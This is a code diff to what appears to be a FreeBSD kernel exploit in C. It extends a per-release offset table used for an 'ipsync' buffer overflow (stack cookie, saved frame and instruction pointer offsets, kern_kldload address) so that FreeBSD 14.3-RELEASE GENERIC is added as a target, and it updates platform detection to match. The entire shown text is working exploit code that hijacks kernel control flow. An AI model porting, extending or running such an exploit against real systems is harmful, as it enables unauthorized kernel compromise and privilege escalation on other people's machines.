@@ -95,7 +95,7 @@ struct print_msg {
   char msg[0];
 };
 
-enum { FBSD_15_GENERIC = 0, FBSD_14_DEBUG = 1, PLATFORM_UNKNOWN = 2 };
+enum { FBSD_14_DEBUG = 0, FBSD_14_GENERIC = 1, FBSD_15_GENERIC = 2, PLATFORM_UNKNOWN = 3 };
 
 struct kernel_offsets {
   unsigned int ipsync_buffer_overflow_size;
@@ -110,23 +110,11 @@ struct kernel_offsets {
 };
 
 /*
- * [0] FreeBSD 15.0-RELEASE GENERIC
- * [1] FreeBSD 14.3-RELEASE GENERIC-DEBUG
+ * [0] FreeBSD 14.3-RELEASE GENERIC-DEBUG
+ * [1] FreeBSD 14.3-RELEASE GENERIC
+ * [2] FreeBSD 15.0-RELEASE GENERIC
  */
 static const struct kernel_offsets koffsets[] = {
-    /* FreeBSD 15.0-RELEASE GENERIC */
-    {
-        .ipsync_buffer_overflow_size = 2896,
-        .stack_cookie_offset = 2832,
-        .td_offset = 2848,                 /* 2872 - 24 */
-        .kernel_module_path_offset = 2872, /* 2864 + 8 */
-        .fileid_offset = 2863,             /* 2840 + 23 */
-        .base_pointer_offset = 2880,
-        .instruction_pointer_offset = 2888,
-        .restored_ebp_address = 0xfffffe0070e098d8, /* 0xfffffe0070e09cc0 - 1000 */
-        .kern_kldload_address = 0xffffffff80b3db70,
-    },
-
     /* FreeBSD 14.3-RELEASE GENERIC-DEBUG */
     {
         .ipsync_buffer_overflow_size = 2896,
@@ -138,6 +126,30 @@ static const struct kernel_offsets koffsets[] = {
         .instruction_pointer_offset = 2888,
         .restored_ebp_address = 0xfffffe0070e09cc0,
         .kern_kldload_address = 0xffffffff80af7af0,
+    },
+    /* FreeBSD 14.3-RELEASE GENERIC */
+    {
+        .ipsync_buffer_overflow_size = 2896,
+        .stack_cookie_offset = 2832,
+        .td_offset = 2848,
+        .kernel_module_path_offset = 2872,
+        .fileid_offset = 2864,
+        .base_pointer_offset = 2880,
+        .instruction_pointer_offset = 2888,
+        .restored_ebp_address = 0xfffffe0070e098d8,
+        .kern_kldload_address = 0xffffffff80b26e00,
+    },
+    /* FreeBSD 15.0-RELEASE GENERIC */
+    {
+        .ipsync_buffer_overflow_size = 2896,
+        .stack_cookie_offset = 2832,
+        .td_offset = 2848,                 /* 2872 - 24 */
+        .kernel_module_path_offset = 2872, /* 2864 + 8 */
+        .fileid_offset = 2863,             /* 2840 + 23 */
+        .base_pointer_offset = 2880,
+        .instruction_pointer_offset = 2888,
+        .restored_ebp_address = 0xfffffe0070e098d8, /* 0xfffffe0070e09cc0 - 1000 */
+        .kern_kldload_address = 0xffffffff80b3db70,
     }};
 
 void cyclic_pattern(char* buf, size_t len) {
@@ -223,9 +235,11 @@ unsigned int get_platform_idx() {
     return PLATFORM_UNKNOWN;
   }
 
-  /* FreeBSD 14.3 GENERIC-DEBUG */
   if (strcmp(u.release, "14.3-RELEASE") == 0) {
+    /* FreeBSD 14.3-RELEASE GENERIC-DEBUG */
     if (strcmp(kern_ident, "GENERIC-DEBUG") == 0) return FBSD_14_DEBUG;
+    /* FreeBSD 14.3-RELEASE GENERIC */
+    if (strcmp(kern_ident, "GENERIC") == 0) return FBSD_14_GENERIC;
 
     return PLATFORM_UNKNOWN;
   }
